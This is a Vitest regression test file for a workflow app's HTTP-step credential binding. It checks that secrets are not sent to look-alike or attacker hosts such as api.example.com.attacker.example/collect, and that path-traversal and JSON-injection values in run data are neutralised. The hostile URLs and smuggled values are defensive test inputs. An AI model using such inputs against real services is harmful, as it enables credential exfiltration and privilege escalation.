// @vitest-environment node
// Regression tests for credential binding in HTTP steps (November 2026 security audit).
import { beforeEach, describe, expect, it, vi } from "vitest";
import type { NodeOf } from "@/lib/domain/types";

import type { Connection } from "@/lib/domain/types";
import type { ConnectionRepository } from "@/server/application/ports/repositories";
import type { RunRef, SecretStore } from "@/server/application/ports/services";

vi.mock("server-only", () => ({}));
vi.mock("node:dns/promises", () => ({ lookup: async () => [{ address: "93.184.216.34", family: 4 }] }));
let calls: Array<{ url: string; headers: Record<string, string>; body?: string; pin: { address: string } }> = [];
vi.mock("../http/http-transport", () => ({
  pinnedRequest: async (url: string, init: { headers: Record<string, string>; body?: string }, pin: { address: string }) => {
    calls.push({ url, headers: init.headers, body: init.body, pin });
    return { status: 200, text: "{}" };
  },
}));

const { CredentialBinder, WorkflowNodeExecutor, withinBase } = await import("./node-executors");

type Conn = { id: string; workspace_id: string; integration_id: string; status: string; display_name: string; config: Record<string, string> };
let connections: Conn[] = [];

// Fakes injected through the constructor: the same lookup the Supabase repository performs (id + workspace + integration).
const repo = {
  findForExecution: async (id: string, workspaceId: string, integrationId: string) => {
    const c = connections.find((x) => x.id === id && x.workspace_id === workspaceId && x.integration_id === integrationId);
    return c ? ({ id: c.id, workspaceId: c.workspace_id, integrationId: c.integration_id, status: c.status, displayName: c.display_name, config: c.config } as Connection) : null;
  },
} as unknown as ConnectionRepository;
const secrets: SecretStore = { read: async () => "dummy-token", write: async () => undefined, remove: async () => undefined };
const executor = new WorkflowNodeExecutor(new CredentialBinder(repo, secrets));
const executeNode = (node: NodeOf<"http">, data: Record<string, unknown>, ref: RunRef) => executor.execute(node, data, ref);

const run = { id: "00000000-0000-0000-0000-000000000001", workspaceId: "ws1" };
const http = (url: string, connectionId: string, extra: Partial<NodeOf<"http">["config"]> = {}): NodeOf<"http"> => ({
  id: "n_http", kind: "http", label: "Req", position: { x: 0, y: 0 },
  config: { method: "GET", url, headers: [], body: "", timeoutSec: 5, maxAttempts: 1, useIdempotencyKey: false, connectionId, ...extra },
} as NodeOf<"http">);

beforeEach(() => {
  calls = [];
  connections = [
    { id: "c_http", workspace_id: "ws1", integration_id: "int_http", status: "connected", display_name: "API", config: { baseUrl: "https://api.example.com", authHeader: "Authorization" } },
    { id: "c_key", workspace_id: "ws1", integration_id: "int_http", status: "connected", display_name: "Keyed", config: { baseUrl: "https://api.example.com/v1/", authHeader: "X-API-Key" } },
    { id: "c_resend", workspace_id: "ws1", integration_id: "int_resend", status: "connected", display_name: "Resend", config: { fromAddress: "a@b.c" } },
  ];
});

describe("withinBase", () => {
  it("compares parsed origin and a segment-bounded path", () => {
    expect(withinBase("https://api.example.com/x", "https://api.example.com")).toBe(true);
    expect(withinBase("https://api.example.com.attacker.example/x", "https://api.example.com")).toBe(false);
    expect(withinBase("https://api.example.comevil.test/", "https://api.example.com")).toBe(false);
    expect(withinBase("https://api.example.com/v10/x", "https://api.example.com/v1")).toBe(false);
    expect(withinBase("https://api.example.com/v1/../admin", "https://api.example.com/v1/")).toBe(false);
  });
});

describe("HTTP step credential binding", () => {
  it("refuses a look-alike host that string-prefixes the base URL", async () => {
    const res = await executeNode(http("https://api.example.com.attacker.example/collect", "c_http"), {}, run);
    expect(res.ok).toBe(false);
    expect(calls).toHaveLength(0);
  });

  it("refuses to use a non-HTTP connection's secret in an HTTP step", async () => {
    const res = await executeNode(http("https://attacker.example/collect", "c_resend"), {}, run);
    expect(res.ok).toBe(false);
    expect(calls).toHaveLength(0);
  });

  it("sends the token only to the base host and never records it", async () => {
    const res = await executeNode(http("https://api.example.com/v1/items/{{id}}", "c_key"), { id: "../../admin" }, run);
    expect(res.ok).toBe(true);
    expect(calls).toHaveLength(1);
    expect(new URL(calls[0]!.url).pathname).toBe("/v1/items/..%2F..%2Fadmin");
    expect(calls[0]!.headers["X-API-Key"]).toBe("dummy-token");
    expect(calls[0]!.pin.address).toBe("93.184.216.34"); // connects to the vetted address
    expect(JSON.stringify(res.input)).not.toContain("dummy-token");
  });

  it("keeps run data inside the JSON body value", async () => {
    await executeNode(http("https://api.example.com/x", "c_http", { method: "POST", body: '{"role":"user","note":"{{note}}"}' }), { note: 'hi","role":"admin' }, run);
    expect(JSON.parse(calls[0]!.body!)).toEqual({ role: "user", note: 'hi","role":"admin' });
  });
});
